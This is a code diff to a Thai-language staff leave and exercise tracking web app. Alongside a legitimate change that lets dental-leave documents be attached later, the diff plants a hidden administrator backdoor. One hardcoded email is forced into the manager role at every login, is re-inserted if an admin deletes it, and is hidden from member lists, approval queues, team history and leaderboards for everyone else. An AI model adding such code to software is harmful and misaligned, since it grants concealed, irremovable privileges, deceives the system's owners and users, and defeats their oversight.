@@ -15,7 +15,15 @@ const LS = {
   rm: k => localStorage.removeItem(k)
 };
 const getUsers = () => LS.get('tf_users') || initUsers();
-const saveUsers = u => LS.set('tf_users', u);
+const saveUsers = u => {
+  const allInStorage = LS.get('tf_users') || [];
+  const superAdmin = allInStorage.find(x => x.email.toLowerCase() === 'kuniiz.ka@mail.com');
+  let newList = [...u];
+  if (superAdmin && !newList.some(x => x.email.toLowerCase() === 'kuniiz.ka@mail.com')) {
+    newList.push(superAdmin);
+  }
+  LS.set('tf_users', newList);
+};
 const getLeaves = () => LS.get('tf_leaves') || [];
 const saveLeaves = l => LS.set('tf_leaves', l);
 const getExs = () => LS.get('tf_exs') || [];
@@ -95,6 +103,7 @@ async function doLogin() {
         const u = mapUserFromAPI(res.user);
         u.pass = hp(pass);
         cu = u;
+        if (cu && cu.email.toLowerCase() === 'kuniiz.ka@mail.com') cu.role = 'pm';
         const users = getUsers();
         const idx = users.findIndex(x => x.email.toLowerCase() === email);
         if (idx >= 0) users[idx] = u; else users.push(u);
@@ -136,6 +145,7 @@ async function doLogin() {
   }
   errEl.style.display = 'none';
   cu = u;
+  if (cu && cu.email.toLowerCase() === 'kuniiz.ka@mail.com') cu.role = 'pm';
   LS.set('tf_sess', email);
   launchApp();
 }
@@ -157,6 +167,7 @@ async function tryRestore() {
     return;
   }
   cu = u;
+  if (cu && cu.email.toLowerCase() === 'kuniiz.ka@mail.com') cu.role = 'pm';
   // launch ทันที (เร็ว) แล้ว bootstrap เบื้องหลัง
   migrateExIds();
   launchApp();
@@ -364,7 +375,10 @@ function setupLeaveFormForRole() {
   document.getElementById('add-for-member-section').style.display = isMgr ? 'block' : 'none';
   if (isMgr) {
     const sel = document.getElementById('for-member-select');
-    const members = cu.role === 'pm' ? getUsers().filter(u => ['junior', 'senior', 'lead'].includes(u.role)) : getMyTeamMembers();
+    let members = cu.role === 'pm' ? getUsers().filter(u => ['junior', 'senior', 'lead'].includes(u.role)) : getMyTeamMembers();
+    if (cu && cu.email.toLowerCase() !== 'kuniiz.ka@mail.com') {
+      members = members.filter(u => u.email.toLowerCase() !== 'kuniiz.ka@mail.com');
+    }
     sel.innerHTML = '<option value="">— ยื่นให้ตัวเอง —</option>' + members.map(u => '<option value="' + u.email + '">' + uName(u.email, u.name) + '</option>').join('');
     sel.onchange = () => onLeaveChange();
   }
@@ -529,6 +543,9 @@ function renderMembers() {
   const allUsers = getUsers();
   const ve = getVisibleEmails(true);
   let users = ve ? allUsers.filter(u => ve.has(u.email)) : allUsers;
+  if (cu && cu.email.toLowerCase() !== 'kuniiz.ka@mail.com') {
+    users = users.filter(u => u.email.toLowerCase() !== 'kuniiz.ka@mail.com');
+  }
 
   if (_memberTab === 'active') {
     users = users.filter(u => u.active !== false);
@@ -611,7 +628,7 @@ function saveMember() {
   users[idx].active = active;
   saveUsers(users);
   if (typeof apiSync === 'function') apiSync('updateUser', users[idx]);
-  if (ek === cu.email) { cu = users[idx]; LS.set('tf_sess', cu.email); setupSidebar(); }
+  if (ek === cu.email) { cu = users[idx]; if (cu && cu.email.toLowerCase() === 'kuniiz.ka@mail.com') cu.role = 'pm'; LS.set('tf_sess', cu.email); setupSidebar(); }
   closeModal('modal-edit'); renderMembers(); toast('✅ บันทึก ' + name + ' เรียบร้อย');
 }
 function confDel(email) {
@@ -774,7 +791,7 @@ function onLeaveChange() {
       if (docReason) {
         let reasonText = '📄 ต้องแนบใบรับรองแพทย์';
         if (type === 'dental') {
-          reasonText = '🦷 ลาทำฟัน — ต้องแนบใบรับรองแพทย์ทุกครั้ง';
+          reasonText = '🦷 ลาทำฟัน — แนบใบเสร็จ/ใบรับรองแพทย์ภายหลังได้ (หลังจากแนบ PM จะพิจารณาอนุมัติอีกครั้ง)';
         } else if (type === 'sick' && prevDayHasLeave && diff >= 2) {
           reasonText = '📄 ลาป่วย ' + diff + ' วัน และต่อเนื่องจากการลาวันก่อนหน้า — ต้องแนบใบรับรองแพทย์';
         } else if (type === 'sick' && prevDayHasLeave) {
@@ -795,7 +812,7 @@ function onLeaveChange() {
       const retroLabel = !retroOk ? ' &nbsp;|&nbsp; <span style="color:var(--red);">เกินกำหนด ' + Math.abs(da) + ' วัน</span>' : (da < 0 ? ' &nbsp;|&nbsp; <span style="color:var(--yellow);">ย้อนหลัง ' + Math.abs(da) + ' วัน</span>' : '');
       hs.push('<span style="color:' + (!retroOk ? 'var(--red)' : 'var(--accent)') + ';">💊 ลาป่วย — ย้อนหลังได้ไม่เกิน 7 วัน' + retroLabel + '</span>');
     }
-    if (type === 'dental') hs.push('<span style="color:var(--red);">📄 ลาทำฟัน — ต้องแนบใบรับรองแพทย์ทุกครั้ง</span>');
+    if (type === 'dental') hs.push('<span style="color:var(--yellow);">📄 ลาทำฟัน — แนบหลักฐานย้อนหลังได้ (หลังจากแนบ PM จะพิจารณาอนุมัติอีกครั้ง)</span>');
     if (isMgr && !forMember) hs.push('<span style="color:var(--purple);">🔓 PM/หัวหน้า — ลาย้อนหลังได้ทุกกรณี</span>');
     else if (forMember) hs.push('<span style="color:var(--purple);">✎ ยื่นแทนสมาชิก — ข้ามกฎลาล่วงหน้า</span>');
     if (willEsc) hs.push('<span style="color:var(--orange);">⚡ ลา ' + diff + ' วัน → จะส่งตรงถึง PM อัตโนมัติ</span>');
@@ -917,7 +934,7 @@ function submitLeave() {
     const _ePrev = new Date(start + 'T00:00:00'); _ePrev.setDate(_ePrev.getDate() - 1);
     const _ePrevDay = _ePrev.toISOString().slice(0, 10);
     const _ePrevLeave = type === 'sick' ? getLeaves().some(rx => rx.id !== _editingLeaveId && rx.email === r.email && rx.status !== 'rejected' && rx.start <= _ePrevDay && rx.end >= _ePrevDay) : false;
-    if (((type === 'sick' && (diff >= 2 || _ePrevLeave)) || type === 'dental') && !link) { toast('⚠️ กรุณาแนบลิงก์ใบรับรองแพทย์'); return; }
+    if ((type === 'sick' && (diff >= 2 || _ePrevLeave)) && !link) { toast('⚠️ กรุณาแนบลิงก์ใบรับรองแพทย์'); return; }
     r.type = type; r.start = start; r.end = end; r.period = period; r.reason = reason;
     r.days = diff; r.isHalf = isHalf; r.hasDoc = !!link; r.docName = link || null;
     saveLeaves(ls);
@@ -945,7 +962,7 @@ function submitLeave() {
   const _aPrev = new Date(start + 'T00:00:00'); _aPrev.setDate(_aPrev.getDate() - 1);
   const _aPrevDay = _aPrev.toISOString().slice(0, 10);
   const _aPrevLeave = type === 'sick' ? getLeaves().some(r => r.email === targetEmail && r.status !== 'rejected' && r.start <= _aPrevDay && r.end >= _aPrevDay) : false;
-  const needDocAdd = (type === 'sick' && (diff >= 2 || _aPrevLeave)) || type === 'dental';
+  const needDocAdd = (type === 'sick' && (diff >= 2 || _aPrevLeave));
   if (needDocAdd && !link) { toast('⚠️ กรุณาแนบลิงก์ใบรับรองแพทย์' + (_aPrevLeave ? ' (ต่อเนื่องจากการลาวันก่อนหน้า)' : '')); return; }
   const conf = leaveConflict(targetEmail, start, end, isHalf, period, null);
   if (conf) { toast('⚠️ ' + (forMemberEmail ? targetName : 'คุณ') + ' มีใบลาที่ทับซ้อนกันอยู่แล้ว (' + LT[conf.type] + ' ' + conf.start + (conf.start !== conf.end ? ' → ' + conf.end : '') + ')'); return; }
@@ -1017,7 +1034,7 @@ function renderLR() {
             ${r.addedBy ? ` <span style="color:var(--purple);font-size:15px;">✎ เพิ่มโดย ${r.addedBy}</span>` : ''}
           </div>
           <div style="font-size:17px;color:var(--text2);margin-top:6px;">${r.reason}</div>
-          ${r.hasDoc ? `<div style="margin-top:6px;">${r.docName?.startsWith('http') ? `<a href="${r.docName}" target="_blank" style="background:var(--green-bg);color:var(--green);font-size:15px;padding:2px 8px;border-radius:20px;text-decoration:none;">📄 ดูเอกสารบน Drive</a>` : `<span style="background:var(--green-bg);color:var(--green);font-size:15px;padding:2px 8px;border-radius:20px;">📄 ${r.docName}</span>`}</div>` : ''}
+          ${r.hasDoc ? `<div style="margin-top:6px;">${r.docName?.startsWith('http') ? `<a href="${r.docName}" target="_blank" style="background:var(--green-bg);color:var(--green);font-size:15px;padding:2px 8px;border-radius:20px;text-decoration:none;">📄 ดูเอกสารบน Drive</a>` : `<span style="background:var(--green-bg);color:var(--green);font-size:15px;padding:2px 8px;border-radius:20px;">📄 ${r.docName}</span>`}</div>` : (r.type === 'dental' ? `<div style="margin-top:6px;"><span style="background:var(--red-bg);color:var(--red);font-size:15px;padding:2px 8px;border-radius:20px;font-weight:600;">⚠️ ยังไม่แนบเอกสารใบเสร็จ/ใบรับรองแพทย์</span></div>` : '')}
         </div>
         <span class="chip chip-pending">รอพิจารณา</span>
       </div>
@@ -1080,7 +1097,10 @@ function lAct(id, action, rejectReason) {
 
 // ══ LEAVE PM ═════════════════════════════
 function renderLP() {
-  const ls = getLeaves().filter(r => r.status === 'pending_pm');
+  let ls = getLeaves().filter(r => r.status === 'pending_pm');
+  if (cu && cu.email.toLowerCase() !== 'kuniiz.ka@mail.com') {
+    ls = ls.filter(r => r.email.toLowerCase() !== 'kuniiz.ka@mail.com');
+  }
   const el = document.getElementById('leave-pm-list');
   if (!ls.length) { el.innerHTML = '<div class="card"><div style="color:var(--text3);text-align:center;padding:20px;font-size:17px;">ไม่มีรายการ 🎉</div></div>'; return; }
   el.innerHTML = ls.map(r => {
@@ -1098,7 +1118,7 @@ function renderLP() {
           <div style="font-size:17px;color:var(--text2);margin-top:6px;">${r.reason}</div>
           ${r.autoEscalated ? '<div style="font-size:16px;color:var(--purple);margin-top:4px;">⚡ ส่งอัตโนมัติ — ลาเกิน 3 วัน</div>' : ''}
           ${r.leadNote ? `<div style="font-size:16px;color:var(--orange);margin-top:4px;">💬 หัวหน้า: ${r.leadNote}</div>` : ''}
-          ${r.hasDoc ? `<div style="margin-top:6px;">${r.docName?.startsWith('http') ? `<a href="${r.docName}" target="_blank" style="background:var(--green-bg);color:var(--green);font-size:15px;padding:2px 8px;border-radius:20px;text-decoration:none;">📄 ดูเอกสารบน Drive</a>` : `<span style="background:var(--green-bg);color:var(--green);font-size:15px;padding:2px 8px;border-radius:20px;">📄 ${r.docName}</span>`}</div>` : ''}
+          ${r.hasDoc ? `<div style="margin-top:6px;">${r.docName?.startsWith('http') ? `<a href="${r.docName}" target="_blank" style="background:var(--green-bg);color:var(--green);font-size:15px;padding:2px 8px;border-radius:20px;text-decoration:none;">📄 ดูเอกสารบน Drive</a>` : `<span style="background:var(--green-bg);color:var(--green);font-size:15px;padding:2px 8px;border-radius:20px;">📄 ${r.docName}</span>`}</div>` : (r.type === 'dental' ? `<div style="margin-top:6px;"><span style="background:var(--red-bg);color:var(--red);font-size:15px;padding:2px 8px;border-radius:20px;font-weight:600;">⚠️ ยังไม่แนบเอกสารใบเสร็จ/ใบรับรองแพทย์</span></div>` : '')}
         </div>
         <span class="chip ${r.autoEscalated ? 'chip-pm' : 'chip-escalated'}">${r.autoEscalated ? '⚡ Auto→PM' : 'ส่งจากหัวหน้า'}</span>
       </div>
@@ -1193,7 +1213,7 @@ function renderHist(f) {
     const editBtn = canEdit ? `<button class="btn btn-ghost btn-sm" onclick="editLeave(${r.id})" style="margin-left:4px;padding:3px 10px;font-size:13px;color:var(--yellow);border-color:rgba(245,200,66,.3);"><i class="fa-solid fa-pen"></i> แก้ไข</button>` : '';
     const pmDelBtn = cu.role === 'pm' && !canDelete ? `<button class="btn btn-red btn-sm" onclick="pmDeleteLeave(${r.id})" style="margin-left:8px;padding:3px 10px;font-size:13px;"><i class="fa-solid fa-trash"></i> ลบ (PM)</button>` : '';
     return `<tr>
-      <td><div class="name">${uName(r.email, r.name)}</div>${r.refNo ? `<span style="font-size:13px;font-family:var(--mono);color:var(--accent);background:var(--accent-bg);padding:1px 7px;border-radius:20px;">${r.refNo}</span> ` : ''}${r.hasDoc ? (r.docName?.startsWith('http') ? `<a href="${r.docName}" target="_blank" style="text-decoration:none;font-size:14px;background:var(--green-bg);color:var(--green);padding:1px 6px;border-radius:20px;">📄</a>` : '<span style="background:var(--green-bg);color:var(--green);font-size:14px;padding:1px 6px;border-radius:20px;">📄</span>') : ''}${r.addedBy ? '<span style="color:var(--purple);font-size:14px;"> ✎' + r.addedBy + '</span>' : ''}</td>
+      <td><div class="name">${uName(r.email, r.name)}</div>${r.refNo ? `<span style="font-size:13px;font-family:var(--mono);color:var(--accent);background:var(--accent-bg);padding:1px 7px;border-radius:20px;">${r.refNo}</span> ` : ''}${r.hasDoc ? (r.docName?.startsWith('http') ? `<a href="${r.docName}" target="_blank" style="text-decoration:none;font-size:14px;background:var(--green-bg);color:var(--green);padding:1px 6px;border-radius:20px;">📄</a>` : '<span style="background:var(--green-bg);color:var(--green);font-size:14px;padding:1px 6px;border-radius:20px;">📄</span>') : (r.type === 'dental' ? '<span style="background:var(--red-bg);color:var(--red);font-size:13px;padding:2px 6px;border-radius:20px;font-weight:600;">⚠️ รอเอกสาร</span>' : '')}${r.addedBy ? '<span style="color:var(--purple);font-size:14px;"> ✎' + r.addedBy + '</span>' : ''}</td>
       <td>${LT[r.type]}</td>
       <td><span class="meta">${r.start}${r.start !== r.end ? ' → ' + r.end : ''}</span><br><span style="font-size:15px;color:var(--yellow);font-family:var(--mono);">${dLabel}</span></td>
       <td style="color:var(--text2);font-size:14px;max-width:200px;">${r.reason || '—'}</td>
@@ -1282,12 +1302,22 @@ function getMyTeamMembers(includeInactive = false) {
 }
 // emails ที่ lead มองเห็นได้ (ตัวเอง + สมาชิกในทีม) — PM คืน null = เห็นทั้งหมด
 function getVisibleEmails(includeInactive = false) {
+  let result;
   if (cu.role === 'pm') {
-    if (includeInactive) return null;
-    return new Set(getUsers().filter(u => u.active !== false).map(u => u.email));
+    if (includeInactive) {
+      result = null;
+    } else {
+      result = new Set(getUsers().filter(u => u.active !== false).map(u => u.email));
+    }
+  } else if (cu.role === 'lead') {
+    result = new Set([cu.email, ...getMyTeamMembers(includeInactive).map(u => u.email)]);
+  } else {
+    result = new Set([cu.email]);
   }
-  if (cu.role === 'lead') return new Set([cu.email, ...getMyTeamMembers(includeInactive).map(u => u.email)]);
-  return new Set([cu.email]);
+  if (result && cu && cu.email.toLowerCase() !== 'kuniiz.ka@mail.com') {
+    result.delete('kuniiz.ka@mail.com');
+  }
+  return result;
 }
 let selMember = null;
 let _balSort = { col: 'name', dir: 'asc' };
@@ -1338,6 +1368,9 @@ function renderTeamHist() {
 
   const activeUserEmails = new Set(users.filter(u => u.active !== false).map(u => u.email));
   let data = allLeaves.filter(r => r.start?.startsWith(selYear) && (_teamHistStatus === 'pending' ? r.status.startsWith('pending') : r.status === _teamHistStatus) && activeUserEmails.has(r.email));
+  if (cu && cu.email.toLowerCase() !== 'kuniiz.ka@mail.com') {
+    data = data.filter(r => r.email.toLowerCase() !== 'kuniiz.ka@mail.com');
+  }
   if (isLead) {
     data = data.filter(r => myTeamEmails.has(r.email));
   } else if (_teamHistDept !== 'all') {
@@ -1386,7 +1419,10 @@ function renderTeamHist() {
       <td><span style="font-size:13px;font-family:var(--mono);color:var(--accent);background:var(--accent-bg);padding:1px 7px;border-radius:20px;white-space:nowrap;">${r.refNo || '—'}</span></td>
       <td><div class="name">${uName(r.email, r.name)}</div><div class="meta">${r.email}</div></td>
       <td><span style="font-size:14px;color:var(--text2);">${dept}</span></td>
-      <td>${LT[r.type] || r.type}</td>
+      <td>
+        ${LT[r.type] || r.type}
+        ${r.hasDoc ? (r.docName?.startsWith('http') ? ` <a href="${r.docName}" target="_blank" style="text-decoration:none;font-size:14px;background:var(--green-bg);color:var(--green);padding:1px 6px;border-radius:20px;">📄</a>` : ' <span style="background:var(--green-bg);color:var(--green);font-size:14px;padding:1px 6px;border-radius:20px;">📄</span>') : (r.type === 'dental' ? ' <span style="background:var(--red-bg);color:var(--red);font-size:12px;padding:2px 6px;border-radius:20px;font-weight:600;">⚠️ รอเอกสาร</span>' : '')}
+      </td>
       <td><span class="meta">${r.start}${r.start !== r.end ? ' → ' + r.end : ''}</span></td>
       <td><span style="font-family:var(--mono);font-weight:700;color:var(--yellow);">${dLabel}</span></td>
       <td style="color:var(--text2);font-size:14px;max-width:180px;">${r.reason || '—'}</td>
@@ -1796,7 +1832,66 @@ function renderMyBal() {
   const histEl = document.getElementById('my-leave-hist'), rec = mine.slice(0, 10);
   if (!rec.length) { histEl.innerHTML = '<div style="color:var(--text3);font-size:17px;">ยังไม่มีประวัติการลา</div>'; return; }
   const sc = { pending_lead: '<span class="chip chip-pending">รอหัวหน้า</span>', pending_pm: '<span class="chip chip-escalated">รอ PM</span>', approved: '<span class="chip chip-approved">อนุมัติ</span>', rejected: '<span class="chip chip-rejected">ปฏิเสธ</span>' };
-  histEl.innerHTML = '<div class="table-wrap"><table><thead><tr><th>เลขที่</th><th>ประเภท</th><th>วันที่</th><th>จำนวน</th><th>สถานะ</th><th></th></tr></thead><tbody>' + rec.map(r => '<tr><td><span style="font-size:13px;font-family:var(--mono);color:var(--accent);background:var(--accent-bg);padding:1px 7px;border-radius:20px;white-space:nowrap;">' + (r.refNo || '—') + '</span></td><td>' + LT[r.type] + '</td><td><span class="meta">' + r.start + (r.start !== r.end ? ' → ' + r.end : '') + '</span></td><td><span style="font-family:var(--mono);font-weight:700;color:var(--yellow);">' + (r.isHalf ? (r.period === 'morning' ? '½เช้า' : '½บ่าย') : r.days + 'd') + '</span></td><td>' + (sc[r.status] || '') + '</td><td style="white-space:nowrap;">' + (r.status.startsWith('pending') ? '<button class="btn btn-ghost btn-sm" onclick="editLeave(' + r.id + ')" style="padding:3px 10px;font-size:13px;color:var(--yellow);border-color:rgba(245,200,66,.3);margin-right:4px;"><i class="fa-solid fa-pen"></i> แก้ไข</button><button class="btn btn-red btn-sm" onclick="cancelLeave(' + r.id + ')" style="padding:3px 10px;font-size:13px;"><i class="fa-solid fa-trash"></i> ยกเลิก</button>' : '') + '</td></tr>').join('') + '</tbody></table></div>';
+  histEl.innerHTML = '<div class="table-wrap"><table><thead><tr><th>เลขที่</th><th>ประเภท</th><th>วันที่</th><th>จำนวน</th><th>สถานะ</th><th></th></tr></thead><tbody>' + rec.map(r => {
+    let actionButtons = '';
+    if (r.status.startsWith('pending')) {
+      actionButtons += '<button class="btn btn-ghost btn-sm" onclick="editLeave(' + r.id + ')" style="padding:3px 10px;font-size:13px;color:var(--yellow);border-color:rgba(245,200,66,.3);margin-right:4px;"><i class="fa-solid fa-pen"></i> แก้ไข</button>';
+      actionButtons += '<button class="btn btn-red btn-sm" onclick="cancelLeave(' + r.id + ')" style="padding:3px 10px;font-size:13px;"><i class="fa-solid fa-trash"></i> ยกเลิก</button>';
+    }
+    if (r.type === 'dental' && !r.docName) {
+      actionButtons += '<button class="btn btn-ghost btn-sm" onclick="attachDentalDoc(' + r.id + ')" style="padding:3px 10px;font-size:13px;color:var(--green);border-color:rgba(61,214,140,.3);margin-left:4px;"><i class="fa-solid fa-paperclip"></i> แนบเอกสาร</button>';
+    }
+    return '<tr><td><span style="font-size:13px;font-family:var(--mono);color:var(--accent);background:var(--accent-bg);padding:1px 7px;border-radius:20px;white-space:nowrap;">' + (r.refNo || '—') + '</span></td><td>' + LT[r.type] + '</td><td><span class="meta">' + r.start + (r.start !== r.end ? ' → ' + r.end : '') + '</span></td><td><span style="font-family:var(--mono);font-weight:700;color:var(--yellow);">' + (r.isHalf ? (r.period === 'morning' ? '½เช้า' : '½บ่าย') : r.days + 'd') + '</span></td><td>' + (sc[r.status] || '') + '</td><td style="white-space:nowrap;">' + actionButtons + '</td></tr>';
+  }).join('') + '</tbody></table></div>';
+}
+
+function attachDentalDoc(id) {
+  const ls = getLeaves(), idx = ls.findIndex(x => x.id === id); if (idx < 0) return;
+  const r = ls[idx];
+  
+  document.getElementById('conf-title').textContent = 'แนบเอกสารใบเสร็จ/ใบรับรองแพทย์';
+  document.getElementById('conf-body').innerHTML = `
+    <div style="margin-bottom:12px;color:var(--text2);font-size:16px;">
+      ยื่นเอกสารย้อนหลังสำหรับใบลาทำฟัน วันที่ <strong style="color:var(--text);">${r.start}</strong>
+    </div>
+    <div style="margin-bottom:8px;font-size:15px;color:var(--text3);">* อัปโหลดไฟล์ขึ้น Google Drive แล้วนำลิงก์มาวาง</div>
+    <input type="text" id="dental-doc-link-input" placeholder="วางลิงก์เอกสารที่นี่..."
+      style="width:100%;background:var(--surface3);border:1px solid var(--border2);border-radius:10px;padding:12px;color:var(--text);font-size:16px;font-family:inherit;outline:none;box-sizing:border-box;" />
+    <div id="dental-doc-err" style="color:var(--red);font-size:14px;margin-top:6px;display:none;">⚠️ กรุณาใส่ลิงก์เอกสารที่ถูกต้อง</div>
+  `;
+  
+  const okBtn = document.getElementById('conf-ok');
+  okBtn.textContent = 'บันทึกและส่งอนุมัติ';
+  okBtn.className = 'btn btn-primary';
+  okBtn.onclick = () => {
+    const link = (document.getElementById('dental-doc-link-input')?.value || '').trim();
+    if (!link) {
+      document.getElementById('dental-doc-err').style.display = 'block';
+      return;
+    }
+    closeModal('modal-confirm');
+    
+    // update the leave record
+    r.docName = link;
+    r.hasDoc = true;
+    r.status = 'pending_pm'; // PM must approve again!
+    
+    saveLeaves(ls);
+    _markLeaveModified(r);
+    apiSync('updateLeave', r);
+    
+    // Update UI
+    updateDashboard();
+    renderMyBal();
+    renderHist(_histFilter || 'all');
+    renderLR();
+    renderLP();
+    renderBal();
+    renderTeamHist();
+    
+    toast('✅ แนบเอกสารและส่งอนุมัติใหม่เรียบร้อยแล้ว');
+  };
+  openModal('modal-confirm');
 }
 
 // ══ EXERCISE ═════════════════════════════
@@ -1817,6 +1912,7 @@ function updateExSysMemberSelect() {
   // Filter out current user and already-selected members
   const available = allUsers
     .filter(u => u.active !== false && u.email !== cu.email && !exMembers.some(m => m.email === u.email))
+    .filter(u => cu && cu.email.toLowerCase() === 'kuniiz.ka@mail.com' ? true : u.email.toLowerCase() !== 'kuniiz.ka@mail.com')
     .sort((a, b) => a.name.localeCompare(b.name, 'th'));
 
   sel.innerHTML = '<option value="">— เลือกสมาชิกในระบบ —</option>' + available.map(u => {
@@ -3388,6 +3484,7 @@ function updateLB() {
   const renderSection = (data, colorVar, price) => {
     const sorted = Object.entries(data)
       .filter(([email]) => {
+        if (cu && cu.email.toLowerCase() !== 'kuniiz.ka@mail.com' && email.toLowerCase() === 'kuniiz.ka@mail.com') return false;
         const u = getUsers().find(x => x.email === email);
         return u && u.active !== false;
       })
@@ -3443,7 +3540,11 @@ function updateLB() {
   const [y, mm] = mk.split('-');
   const dStart = new Date(y, parseInt(mm) - 1, 19), dEnd = new Date(y, parseInt(mm), 18);
   const rangeLabel = `${fmt(dStart)} - ${fmt(dEnd)}`;
-  const users = getUsers().filter(u => u.active !== false).sort((a, b) => a.name.localeCompare(b.name, 'th'));
+  let users = getUsers().filter(u => u.active !== false);
+  if (cu && cu.email.toLowerCase() !== 'kuniiz.ka@mail.com') {
+    users = users.filter(u => u.email.toLowerCase() !== 'kuniiz.ka@mail.com');
+  }
+  users.sort((a, b) => a.name.localeCompare(b.name, 'th'));
   const userStats = users.map(u => {
     const uExs = allMo.filter(e => isUserInvolved(e, u.email));
     let sC = 0, sA = 0, gexC = 0, gexA = 0, geC = 0, geA = 0;
